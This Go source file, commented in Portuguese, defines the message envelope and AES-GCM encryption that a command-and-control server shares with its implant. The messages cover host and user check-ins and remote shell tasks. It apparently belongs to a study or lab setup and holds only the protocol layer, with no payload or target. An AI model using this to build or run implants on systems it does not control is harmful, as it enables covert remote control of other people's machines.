// Package proto: tipos de mensagem e criptografia compartilhados
// entre o servidor C2 e o implant.
package proto

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
)

// ===== ESTRUTURAS DE MENSAGEM =====

// Message é o envelope único trocado nas duas direções.
type Message struct {
	ID      string   `json:"id"`                // ID único do implant
	Kind    string   `json:"kind"`              // "checkin" (implant→server) | "tasks" (server→implant)
	Info    SysInfo  `json:"info,omitempty"`    // enviado só no primeiro contato
	Results []Result `json:"results,omitempty"` // resultados pendentes
	Tasks   []Task   `json:"tasks,omitempty"`   // tarefas atribuídas
}

// SysInfo: o que o implant reporta no registro.
type SysInfo struct {
	Hostname string `json:"hostname"`
	User     string `json:"user"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	PID      int    `json:"pid"`
}

// Task: comando a executar. Formato simples: "shell <cmd>", "sleep <n>", "exit".
type Task struct {
	UID string `json:"uid"`
	Cmd string `json:"cmd"`
}

// Result: saída de uma task.
type Result struct {
	UID     string `json:"uid"`
	Output  string `json:"output"`
	Success bool   `json:"success"`
}

// ===== CRIPTOGRAFIA (AES-256-GCM) =====

// DeriveKey deriva a chave simétrica de um segredo compartilhado.
// Em produção real usaríamos PBKDF2/Argon2 + chave por implante;
// aqui mantemos simples por ser ambiente de estudo.
func DeriveKey(secret string) []byte {
	h := sha256.Sum256([]byte(secret))
	return h[:]
}

// Encrypt cifra e retorna em base64 (mais fácil de trafegar em JSON/HTTP).
func Encrypt(key,plaintext []byte) (string,error) {
	block,err := aes.NewCipher(key)
	if err !=nil {
		return "",err
	}
	gcm,err := cipher.NewGCM(block)
	if err !=nil {
		return "",err
	}
	nonce := make([]byte,gcm.NonceSize())// nonce aleatório a cada mensagem
	if _,err := rand.Read(nonce);err !=nil {
		return "",err
	}
	// GCM autentica o ciphertext — detecta manipulação/cripto falha
	return base64.StdEncoding.EncodeToString(
		gcm.Seal(nonce,nonce,plaintext,nil)),nil
}

// Decrypt faz o caminho inverso.
func Decrypt(key []byte,enc string) ([]byte,error) {
	data,err := base64.StdEncoding.DecodeString(enc)
	if err !=nil {
		return nil,err
	}
	block,_ := aes.NewCipher(key)
	gcm,_ := cipher.NewGCM(block)
	if len(data) <gcm.NonceSize() {
		return nil,errors.New("ciphertext truncado")
	}
	nonce,ct := data[:gcm.NonceSize()],data[gcm.NonceSize():]
	return gcm.Open(nil,nonce,ct,nil)
}

// EncodeMessage serializa + cifra um envelope.
func EncodeMessage(key []byte,msg any) (string,error) {
	b,err := json.Marshal(msg)
	if err !=nil {
		return "",err
	}
	return Encrypt(key,b)
}

// DecodeMessage decifra + desserializa para a struct de destino.
func DecodeMessage(key []byte,data string,out any)error {
	b,err := Decrypt(key,data)
	if err !=nil {
		return err
	}
	return json.Unmarshal(b,out)
}
